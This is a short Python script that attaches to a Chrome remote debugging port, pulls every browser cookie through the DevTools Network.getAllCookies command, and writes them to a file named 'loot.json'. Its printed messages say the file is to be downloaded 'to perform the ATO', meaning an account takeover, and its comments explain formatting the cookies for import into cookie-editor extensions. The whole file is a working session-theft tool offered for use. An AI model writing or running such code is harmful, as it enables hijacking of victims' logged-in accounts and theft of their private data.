import requests
import json
import websocket # pip3 install websocket-client

# --- Configuration ---
# Ensure this matches the port you used in the headless command
DEBUG_PORT = 9222
OUTPUT_FILE = "loot.json"

try:
    # 1. Get the WebSocket Debug URL
    print(f"[*] Connecting to Chrome Debugger on port {DEBUG_PORT}...")
    resp = requests.get(f"http://localhost:{DEBUG_PORT}/json")
    data = resp.json()
    
    # Grab the first available target (usually the background page)
    ws_url = data[0]['webSocketDebuggerUrl']

    # 2. Connect via WebSocket
    ws = websocket.create_connection(ws_url)
    
    # 3. Ask for ALL Cookies
    print("[*] Sending Network.getAllCookies command...")
    payload = json.dumps({
        "id": 1,
        "method": "Network.getAllCookies"
    })
    ws.send(payload)

    # 4. Receive and Parse
    result = ws.recv()
    response_data = json.loads(result)
    cookies = response_data['result']['cookies']

    print(f"[*] Extracted {len(cookies)} cookies.")

    # 5. formatting for "EditThisCookie" / "Cookie-Editor"
    # Most extensions expect a simple array of cookie objects.
    # We save them exactly as Chrome gave them to us.
    with open(OUTPUT_FILE, "w") as f:
        json.dump(cookies, f, indent=4)

    print(f"[+] Success! Cookies saved to '{OUTPUT_FILE}'")
    print(f"[+] Download this file to your machine to perform the ATO.")

    ws.close()

except Exception as e:
    print(f"[!] Error: {e}")
